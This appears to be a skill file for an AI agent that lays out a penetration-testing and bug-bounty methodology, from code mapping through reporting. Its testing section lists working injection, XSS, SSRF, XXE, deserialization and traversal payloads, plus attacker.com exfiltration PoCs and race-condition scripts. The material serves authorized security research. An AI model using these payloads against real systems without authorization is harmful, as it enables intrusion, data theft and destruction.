---
name: 0-day
description: Systematic vulnerability research for CVE discovery, bug bounty methodology, patch-diff auditing, and offensive security work. Combines strategic architecture analysis with tactical exploitation testing. Covers source-to-sink tracing, trust boundary violations, authorization flaws, and variant hunting.
---

# 0-Day Vulnerability Research Skill

## When to Use This Skill

✓ Analyzing new codebases for unknown vulnerabilities  
✓ Performing penetration tests (web, API, mobile, infrastructure)  
✓ Researching CVE root causes and variant hunting  
✓ Reviewing security patches for incomplete fixes  
✓ Bug bounty research and submission preparation  
✓ HackTheBox/CTF vulnerability discovery  
✓ Designing exploit chains and PoCs  

---

# Quick Start Workflow

1. **Map** — Understand architecture, entry points, data flows
2. **Enumerate** — Find all input surfaces and sensitive operations
3. **Trace** — Follow data from untrusted source to risky sink
4. **Test** — Validate with minimal payloads, not spray
5. **Variant** — Hunt for the entire vulnerability class
6. **Patch-Diff** — Analyze security commits for incomplete fixes and siblings
7. **Exploit** — Build minimal, reproducible PoC with documented impact
8. **Report** — Confirm exploitability, document chain, submit with evidence

---

# Phase 1: Architecture Mapping (Strategic Foundation)

Never test before understanding the system.

## Quick Questions

- What are the main components? (web, API, database, external services)
- What authentication methods exist? (OAuth, JWT, sessions, API keys)
- What user roles/privilege levels exist?
- What trust boundaries exist? (user ↔ system, internal ↔ external, tenant isolation)
- What data flows between components?

## Commands for Reconnaissance

```bash
# Web app structure
ls -la && find . -type d -maxdepth 2 | sort
ls -la src/ app/ config/ routes/ controllers/ models/ views/

# Find entry points (all input vectors)
grep -rn "\$_POST\|\$_GET\|\$_REQUEST\|->get(\|->post(\|@RequestParam\|@RequestBody" --include="*.php" --include="*.java" --include="*.js" --include="*.py" | head -20

# Python Flask/FastAPI input patterns
grep -rn "@app.route\|@router\.\|request\.args\|request\.form\|request\.json\|request\.get_json" --include="*.py" | head -20

# Go-specific input patterns
grep -rn "r\.URL\.Query()\|r\.FormValue\|chi\.URLParam\|mux\.Vars\|r\.PostForm" --include="*.go" | head -20

# Authentication mechanisms
grep -rn "authenticate\|verifyToken\|session\|jwt\|oauth\|middleware.*auth" --include="*.php" --include="*.java" --include="*.js" | head -15

# Authorization checks
grep -rn "isAdmin\|hasRole\|canAccess\|permission\|owner\|authorize\|Access Control" --include="*.php" --include="*.java" --include="*.js"

# Go-specific: default binds and auth gaps
grep -rn ":8080\|0.0.0.0\|Addr\s*:" --include="*.go" | grep -v vendor
grep -rn "HandleFunc\|NewServeMux" --include="*.go" -A 3 | grep -v middleware

# Database queries (find potential injection points)
grep -rn "SELECT\|INSERT\|UPDATE\|DELETE\|query\|execute\|sql.Query" --include="*.php" --include="*.java" --include="*.js" | head -15
```

**Output**: Component map, privilege model, trust boundaries, entry points.

---

# Phase 2: Attack Surface Enumeration

List every exposed function before testing anything.

## Web/API Surfaces

```bash
# Form inputs
grep -rn "<input\|<textarea\|<select" --include="*.html" --include="*.php" --include="*.tpl"

# API endpoints
grep -rn "@PostMapping\|@GetMapping\|@PutMapping\|post(/\|get(/\|router.post\|router.get" --include="*.java" --include="*.js"

# Upload functionality
grep -rn "move_uploaded_file\|\$_FILES\|multipart\|upload\|file" --include="*.php" --include="*.java" --include="*.js" | grep -i upload

# Search/filter endpoints
grep -rn "search\|filter\|query\|where\|find" --include="*.php" --include="*.java" --include="*.js" | head -10

# Export/import
grep -rn "export\|import\|csv\|xml\|json\|download" --include="*.php" --include="*.java" --include="*.js"

# GraphQL
find . -name "*.graphql" || find . -name "schema.graphql"
curl -s http://localhost:8080/graphql | grep -i schema

# Endpoint discovery (brute-force hidden routes)
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
     -u http://localhost/FUZZ -mc 200,301,302,403
feroxbuster --url http://localhost --depth 2 --wordlist /usr/share/wordlists/dirb/common.txt
```

## Sensitive Operations (Sinks)

For each endpoint, identify what it does:

- **Authentication**: Login, token generation, session creation
- **Authorization**: Permission checks, ownership validation
- **Data Access**: Database reads, file access, object retrieval
- **Execution**: Template rendering, deserialization, code evaluation
- **Network**: Outbound requests, internal service calls

---

# Phase 3: Trust Boundary & Source-Sink Analysis

Find where untrusted data enters trusted operations.

## Trace Every Input Path

```
Attacker Input (source) → Validation? → Sanitization? → Sensitive Operation (sink)
```

For each source:

```
Source: User email field in registration
├─ Entry point: POST /register → email parameter
├─ Validation: email regex check
├─ Sanitization: None
├─ Sinks: 
│  ├─ Stored in database
│  ├─ Rendered in admin email panel (STORED XSS?)
│  └─ Rendered in user profile (STORED XSS?)
└─ Trust boundary: User input → Admin view (crosses boundary without output encoding)
```

## Questions to Ask at Each Boundary

- Is the input validated? (How? Can it be bypassed?)
- Is the input sanitized? (How? What about encoding tricks?)
- Is there authorization checking?
- What happens if input is **longer than expected**? (Buffer overflow, DoS)
- What if input has **special characters**? (SQL, template, XML, path traversal)
- What if input is **Unicode or encoded**? (Bypass regex sanitizers)

---

# Phase 4: Vulnerability Testing by Category

### A. Authentication & Session

Test for:

- **Missing authentication** — Try accessing `/admin`, `/dashboard`, `/api/users` without login
- **Default credentials** — Try `admin:admin`, `admin:password`, `root:root`
- **Weak password reset** — Token reuse, token prediction, no rate limit
- **Session fixation** — Set your own session ID
- **JWT issues** — None/HS256 algorithm, expired token acceptance, signature bypass
- **MFA bypass** — OTP reuse within validity window, backup code brute-force, step-skipping (go directly to post-MFA endpoint)
- **Account enumeration** — Timing differences or distinct error messages on login/reset (e.g., "user not found" vs "wrong password")

```bash
# Quick checks
curl -s http://localhost/admin                    # Missing auth?
curl -s http://localhost/api/users -H "Authorization: Bearer invalid"  # Weak validation?
curl -s http://localhost/password-reset?token=123  # Token predictable?

# Account enumeration via timing
time curl -s -X POST http://localhost/login -d "user=valid@example.com&pass=wrong"
time curl -s -X POST http://localhost/login -d "user=nonexistent@example.com&pass=wrong"
# Significantly different times → valid username oracle

# MFA step-skip: after first factor, hit protected endpoint directly
curl -s http://localhost/dashboard -H "Cookie: session=partial_auth_token"
```

### B. Authorization (IDOR, Privilege Escalation)

**Top issue: Missing ownership checks**

Test for:

- **IDOR (Insecure Direct Object Reference)** — Change numeric IDs in URLs/params
  ```bash
  # Access User A's data
  curl -s http://localhost/api/profile/1 -H "Cookie: session=user_a_token"
  
  # Try to access User B's data
  curl -s http://localhost/api/profile/2 -H "Cookie: session=user_a_token"
  # If this returns User B's data → IDOR
  ```

- **Missing tenant isolation** — Create two accounts on same domain, verify data doesn't leak
- **Privilege escalation** — Can user role change to admin? Can user claim ownership of admin objects?
- **Ownership bypass** — Can you delete other users' data?

### C. Injection Vulnerabilities

#### SQL Injection

```bash
# Test endpoint
curl -s "http://target/search?q=test' OR '1'='1"

# Check for:
grep -rn "SELECT.*\+" --include="*.php" --include="*.java" --include="*.js" --include="*.py"
grep -rn "query(\|execute(\|sql(" --include="*.php" --include="*.java" --include="*.js"
```

**Payloads**:
```
' OR '1'='1
' UNION SELECT NULL,NULL,NULL--
1' AND SLEEP(5)--
1' AND 1=1--
```

#### Command Injection

Look for:

```bash
grep -rn "exec\|system\|passthru\|shell_exec\|proc_open\|subprocess" --include="*.php" --include="*.py" --include="*.js"
grep -rn "os.system\|subprocess.Popen\|child_process.exec" --include="*.py" --include="*.js"
```

**Payloads**:
```
; id
| whoami
`id`
$(whoami)
&& whoami
```

#### Template Injection (SSTI)

Look for:

```bash
grep -rn "render\|template\|jinja\|mako\|Velocity\|Freemarker" --include="*.py" --include="*.java" --include="*.js"
grep -rn "nofilter\|raw\|safe\|autoescape\s*=\s*False" --include="*.py" --include="*.html" --include="*.twig"
```

**Payloads**:
```
{{7*7}}           # Jinja2/Django
${7*7}            # Java
<%= 7*7 %>        # ERB (Ruby)
{{config}}        # Flask config exposure
```

#### XSS (Reflected & Stored)

**Email fields are highest-value** — rendered in admin panels, often unescaped.

```bash
# Find where user input is rendered
grep -rn "echo\|print\|<%= \|\{\{" --include="*.php" --include="*.twig" --include="*.html" --include="*.js"

# Check for nofilter/raw (dangerous)
grep -rn "nofilter\|raw\|safe\|sanitize\s*=\s*false" --include="*.twig" --include="*.html"
```

**Test flow**:
1. Register with email: `test"><svg/onload=alert(1)>@example.com`
2. Check if rendered in admin panel, user profile, email UI
3. Try stored in comment/bio field

**Payloads**:
```
"><svg/onload=alert(1)>
<img src=x onerror=alert(1)>
<body onload=alert(1)>
javascript:alert(1)
```

**Bypass regex sanitizers with entity encoding**:
```
&#60;img src=x onerr&#111;r=alert(1)&#62;
Browser decodes to: <img src=x onerror=alert(1)>
```

#### Path Traversal

```bash
grep -rn "file_get_contents\|fopen\|include\|require\|readFile\|fs.read" --include="*.php" --include="*.py" --include="*.js"
```

**Payloads**:
```
../../../etc/passwd
....//....//....//etc/passwd
..%2f..%2f..%2fetc%2fpasswd
..%252f..%252f..%252fetc%252fpasswd   # Double URL-encoded
../../../etc/passwd%00.jpg            # Null byte (truncates extension, older PHP)
..\..\..\windows\win.ini              # Windows path
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd  # Full URL-encoded
```

#### SSRF (Server-Side Request Forgery)

Look for:

```bash
grep -rn "curl\|fopen\|file_get_contents.*http\|requests.get\|urllib" --include="*.php" --include="*.py" --include="*.js"
```

**Payloads**:
```
http://169.254.169.254/latest/meta-data/          # AWS EC2 IMDS
http://169.254.169.254/metadata/instance           # Azure IMDS
http://metadata.google.internal/computeMetadata/v1/ # GCP (requires Metadata-Flavor: Google header)
http://127.0.0.1:6379/_FLUSHALL                   # Internal Redis
file:///etc/passwd                                  # LFI via SSRF
gopher://127.0.0.1:6379/_FLUSHALL%0D%0A           # Redis via Gopher
dict://127.0.0.1:11211/stats                       # Memcached via DICT
```

#### XXE (XML External Entity)

Common in Java/PHP apps that parse XML (SOAP, SVG, DOCX, Excel uploads).

Look for:

```bash
grep -rn "XMLParser\|DocumentBuilder\|SAXParser\|DOMParser\|SimpleXML\|xml.etree\|lxml\|libxml" --include="*.java" --include="*.php" --include="*.py" --include="*.js"
grep -rn "Content-Type.*xml\|text/xml\|application/xml" --include="*.java" --include="*.php" --include="*.py"
```

**Payload — File Read**:
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

**Payload — SSRF via XXE**:
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>&xxe;</root>
```

**Blind XXE (out-of-band)**:
```xml
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
```

**Remediation check**: Confirm `FEATURE_EXTERNAL_GENERAL_ENTITIES` and `FEATURE_EXTERNAL_PARAMETER_ENTITIES` are disabled.

#### Deserialization

Affects Java (`ObjectInputStream`), PHP (`unserialize`), Python (`pickle`, `yaml.load`), Ruby (`Marshal.load`).

Look for:

```bash
grep -rn "ObjectInputStream\|readObject\|fromXML\|XStream" --include="*.java"
grep -rn "unserialize(" --include="*.php"
grep -rn "pickle\.loads\|pickle\.load\b" --include="*.py"
grep -rn "yaml\.load\b" --include="*.py"  # safe: yaml.safe_load
grep -rn "Marshal\.load\|JSON\.parse.*reviver" --include="*.rb" --include="*.js"
```

**Test**:
- Java: use `ysoserial` to generate gadget chains, send as serialized object
- PHP: craft a `__wakeup()` / `__destruct()` payload object
- Python: `pickle.loads(attacker_bytes)` executes arbitrary code
- YAML: `yaml.load("!!python/object/apply:os.system ['id']")`

**Key indicator**: Any endpoint accepting `application/x-java-serialized-object` or base64 blob starting with `rO0AB` (Java) is immediately suspicious.

#### Mass Assignment

User-supplied JSON/form fields assigned directly to model objects — allows injecting privileged fields like `role`, `isAdmin`, `balance`.

Look for:

```bash
grep -rn "fromJson\|\$fill\|\$guarded\|\$fillable\|bindParam\|assign(\|update(req\." --include="*.php" --include="*.java" --include="*.js"
# Laravel: check $guarded vs $fillable
grep -rn "\$guarded\s*=\s*\[\s*\]" --include="*.php"  # Empty guarded = all fields writable
# Node/Express: req.body passed to model directly
grep -rn "\.save(req\.body\|\.create(req\.body\|\.update(req\.body" --include="*.js"
```

**Test**:
```bash
# Registration: inject role field
curl -X POST http://localhost/register \
  -H "Content-Type: application/json" \
  -d '{"username":"attacker","password":"pass","role":"admin"}'

# Profile update: inject balance/credit
curl -X PUT http://localhost/api/profile \
  -H "Content-Type: application/json" \
  -d '{"name":"attacker","balance":999999}'
```

### D. Business Logic Flaws

Review workflows end-to-end:

- **Can steps be skipped?** (Registration → email verification → full access)
- **Can limits be bypassed?** (Rate limits, account limits, transaction limits)
- **Can actions be repeated?** (Double-charging, double-voting)
- **Can state become inconsistent?** (Payment confirmed but order not created)

**Example**: Payment processing
```
1. User adds item to cart
2. Price calculated: $100
3. User clicks "Proceed to Payment" (DON'T finish yet)
4. Admin reduces item price to $50
5. User completes payment with old cart (pays $100 for $50 item)
```

### E. Race Conditions

Concurrent requests can violate single-use or check-then-act assumptions.

**High-value targets**: coupon/promo codes, account credits, email verification tokens, referral bonuses, file uploads.

```bash
# Send 20 simultaneous requests (bash parallel)
seq 1 20 | xargs -P20 -I{} curl -s -X POST http://localhost/redeem \
  -H "Cookie: session=user_token" \
  -d "coupon=SAVE50"

# Python race condition PoC
import threading, requests

def redeem():
    requests.post("http://localhost/redeem",
                  cookies={"session": "user_token"},
                  data={"coupon": "SAVE50"})

threads = [threading.Thread(target=redeem) for _ in range(20)]
[t.start() for t in threads]
[t.join() for t in threads]
```

**Pattern to find**:
```bash
# Check-then-act without locking
grep -rn "if.*balance\|if.*credits\|if.*used\b" --include="*.php" --include="*.py" --include="*.js" -A 3 | grep -v "lock\|mutex\|atomic\|transaction"
```

### F. GraphQL-Specific

```bash
# Introspection enabled?
curl -X POST http://localhost/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name}}}"}'

# Sensitive fields exposed?
curl -X POST http://localhost/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{users{id email passwordHash ssn}}"}'

# Query complexity limits?
curl -X POST http://localhost/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{a:users{b:users{c:users{d:users{e:users{name}}}}}}"}'
```

### G. CORS Misconfiguration

Misconfigured CORS allows attacker-controlled sites to make credentialed cross-origin requests.

Look for:

```bash
grep -rn "Access-Control-Allow-Origin\|cors\|CORS\|AllowOrigins" --include="*.js" --include="*.go" --include="*.py" --include="*.java"
```

**Test**:
```bash
# Does server reflect arbitrary Origin with credentials allowed?
curl -s -I http://localhost/api/profile \
  -H "Origin: https://attacker.com" \
  -H "Cookie: session=user_token"
# Dangerous if both of these are in response:
# Access-Control-Allow-Origin: https://attacker.com
# Access-Control-Allow-Credentials: true

# Null origin bypass
curl -s -I http://localhost/api/profile \
  -H "Origin: null" \
  -H "Cookie: session=user_token"
```

**PoC (attacker page)**:
```html
<script>
fetch("http://localhost/api/profile", {credentials: "include"})
  .then(r => r.json())
  .then(d => fetch("http://attacker.com/steal?d=" + JSON.stringify(d)));
</script>
```

### H. Prototype Pollution (Node.js)

Attacker merges `__proto__` into an object, poisoning Object.prototype globally.

Look for:

```bash
grep -rn "merge(\|extend(\|deepMerge\|assign(\|cloneDeep" --include="*.js" -A 3
grep -rn "\[.*\]\s*=\s*" --include="*.js" | grep -v "const\|let\|var "  # dynamic key assignment
```

**Test payload** (in any JSON body with recursive merge):
```json
{"__proto__": {"isAdmin": true}}
{"constructor": {"prototype": {"isAdmin": true}}}
```

**Verify**:
```bash
curl -X POST http://localhost/api/settings \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"isAdmin":true}}'
# Then: curl http://localhost/api/admin  → should now be accessible
```

### I. HTTP Header Injection & Abuse

Trust in forwarded headers can bypass access controls or poison cache/routing.

```bash
# IP-based access control bypass
curl http://localhost/admin -H "X-Forwarded-For: 127.0.0.1"
curl http://localhost/admin -H "X-Real-IP: 127.0.0.1"
curl http://localhost/admin -H "X-Original-URL: /admin"
curl http://localhost/admin -H "X-Rewrite-URL: /admin"

# Host header injection → password reset poisoning
curl -X POST http://localhost/password-reset \
  -H "Host: attacker.com" \
  -d "email=victim@example.com"
# If reset link uses Host header, victim gets: http://attacker.com/reset?token=...

# Cache poisoning probe
curl http://localhost/ \
  -H "X-Forwarded-Host: attacker.com" \
  -H "Cache-Control: no-cache"
```

Look for:

```bash
grep -rn "X-Forwarded-For\|X-Real-IP\|X-Original-URL\|getHeader.*Host\|request\.host" --include="*.php" --include="*.java" --include="*.go" --include="*.py"
grep -rn "reset.*link\|reset.*url\|password.*reset" --include="*.php" --include="*.java" --include="*.py" -A 5 | grep -i "host\|domain\|url"
```

### J. Sensitive Information Leakage

Quick checks:

```bash
curl -s http://localhost/.env
curl -s http://localhost/.git/config
curl -s http://localhost/wp-config.php.bak
curl -s http://localhost/.env.backup
curl -s http://localhost/phpinfo.php
curl -s http://localhost/debug
curl -s http://localhost/api/ | grep -i swagger
```

---

# Phase 5: Variant Hunting

**Don't stop after finding one bug — find the entire vulnerability class.**

For each finding:

```
1. Identify the root cause (e.g., "email field not escaped in templates")
2. Find all similar code paths:
   - Same function name in different files
   - Same template rendering pattern
   - Same database query pattern
3. Test each variant
4. Report all together
```

**Example**: Found XSS in user email → check:
- Username field
- Full name field  
- Bio/profile fields
- Any user-controlled field rendered in templates

```bash
# Find similar code patterns
grep -rn "{% user\." --include="*.twig"  # All user field renderings
grep -rn "{{ profile\." --include="*.html"  # All profile renderings
grep -rn "echo \$user" --include="*.php"   # All user field echoes
```

---

# Phase 6: Patch-Diff Analysis (High-Value Technique)

When a CVE exists, analyze the fix:

```bash
git log --oneline --grep="security\|fix\|patch\|CVE" | head -20
git show <commit_hash>
```

For each security commit:

1. **What was changed?** (Files, functions, validation added)
2. **Why?** (Root cause of the original bug)
3. **Are there similar locations?** (Legacy code paths, duplicate functions)
4. **Is the fix complete?** (Or can it still be bypassed?)

**Example**: CVE-2025-xxxxx - XSS in email field

```bash
git show CVE-2025-xxxxx
# Shows: email field now escaped in template

# Search for other email rendering
grep -rn "user.email\|{{ email }}\|echo.*email" --include="*.html" --include="*.twig" --include="*.php"
# Find unescaped instances → More CVEs
```

---

# Phase 7: Exploitation & PoC Development

Once vulnerability confirmed:

1. **Understand impact** — What's actually at risk?
2. **Craft exploit** — Minimal, reproducible
3. **Document chain** — Show full attack flow
4. **Validate** — Test against production-like environment

## Exploit Template

```python
#!/usr/bin/env python3
import requests
import sys

class Exploit:
    def __init__(self, target_url):
        self.target = target_url
        self.session = requests.Session()
    
    def check_vulnerable(self):
        """Test if target is vulnerable"""
        payload = "test><svg/onload=alert(1)>"
        resp = self.session.get(f"{self.target}/register?email={payload}")
        return "svg" in resp.text and "onload" in resp.text
    
    def exploit(self):
        """Perform exploitation"""
        if not self.check_vulnerable():
            print("[!] Target not vulnerable")
            return False
        
        print("[+] Target vulnerable!")
        # Exploitation steps...
        return True

if __name__ == "__main__":
    exploit = Exploit(sys.argv[1])
    exploit.exploit()
```

---

# Phase 8: Reporting Template

```
## Vulnerability Title
Concise, specific title

## Severity
Critical / High / Medium / Low

## Summary
Short description of the issue

## Root Cause
Why does this vulnerability exist?

## Affected Component
Exact file, function, line numbers

## Attack Surface
How does attacker interact with the vulnerability?

## Impact
What are the security consequences?
- Confidentiality: Can user X read user Y's data?
- Integrity: Can user X modify user Y's data?
- Availability: Can user X crash the service?

## Proof of Concept
Minimal, reproducible steps

## Remediation
Recommended fix

## Confidence
High / Medium / Low

## References
CVE links, related findings
```

---

# Go-Specific Checks

Go security tools and applications are frequently under-audited:

```bash
# Default binds (should be 127.0.0.1, not 0.0.0.0)
grep -rn ":8080\|:8000\|:5000\|Addr.*:" --include="*.go" | grep -v "127.0.0.1"

# Unbounded reads (io.Copy without io.LimitReader)
grep -rn "io.ReadAll\|io.Copy" --include="*.go" -A 2 | grep -v "LimitReader"

# Missing auth middleware
grep -rn "HandleFunc\|NewServeMux\|Handle(" --include="*.go" -A 2 | grep -v "middleware"

# Context without timeout (potential goroutine leak)
grep -rn "context.Background()" --include="*.go"

# Insecure randomness (math/rand vs crypto/rand)
grep -rn "math/rand\b" --include="*.go"  # Should be crypto/rand for tokens/keys

# Suppressed linter warnings
grep -rn "//nolint\|// nolint\|// nosec" --include="*.go"

# TODO comments revealing gaps
grep -rn "TODO\|FIXME\|XXX\|HACK" --include="*.go" | grep -i "auth\|limit\|security\|check"

# Run gosec (Go security linter)
gosec ./...

# Audit third-party dependencies for known CVEs
go list -m all | nancy sleuth
govulncheck ./...
```

---

# Static Analysis Tools

Run these before manual review to surface low-hanging fruit:

```bash
# Universal pattern-based SAST (works across languages)
semgrep --config=p/owasp-top-ten .
semgrep --config=p/jwt .
semgrep --config=p/secrets .

# Python security linter
bandit -r . -ll

# Go security linter
gosec ./...

# Credential/secret scanning in source and git history
gitleaks detect --source . --verbose
trufflehog filesystem . --only-verified

# Automated CVE template scanner (active)
nuclei -u http://localhost -t cves/ -t exposures/ -t vulnerabilities/

# JavaScript/Node dependency audit
npm audit
yarn audit
```

---

# Methodology Mindset

1. **Always map before testing** — Understand the system first
2. **Trace data from source to sink** — Don't test randomly
3. **Authorization bypasses are systemic** — Find one, find others nearby
4. **Regex is not a parser** — Entity encoding bypasses regex sanitizers
5. **Output escaping is your defense** — Find unescaped template variables
6. **Email fields are goldmines** — Rendered in admin panels without escaping
7. **Registration forms are high-value** — Every field gets stored and rendered
8. **Variant hunting beats isolated findings** — Find the class, not instances
9. **Patch diffs reveal future CVEs** — Learn from fixed bugs
10. **Document findings immediately** — Memory degrades faster than software; write notes as you go

---

# Quick Reference: Common Commands

```bash
# Map structure
find . -type f -name "*.php" -o -name "*.java" -o -name "*.js" -o -name "*.py" | wc -l
find . -type d -maxdepth 2 | sort

# Find all inputs
grep -rn "\$_POST\|\$_GET\|@RequestParam\|@RequestBody\|request.args\|request.form" --include="*.php" --include="*.java" --include="*.js" --include="*.py" | wc -l

# Find all auth
grep -rn "authenticate\|verifyToken\|login\|session" --include="*.php" --include="*.java" --include="*.js" | head -20

# Test target
curl -s -o /dev/null -w "%{http_code}" http://target/
curl -s http://target/admin
curl -s http://target/.env

# Start Burp/analysis
# For HackTheBox: Target in VM, Burp listening on host
```

---

# References & Further Reading

- OWASP Testing Guide: https://owasp.org/www-project-web-security-testing-guide/
- GitHub Advisory Database: https://github.com/advisories
- CVE Details: https://www.cvedetails.com/
- HackerOne Reports: https://hackerone.com/reports
- OffSec Proving Grounds: https://www.offensive-security.com/labs/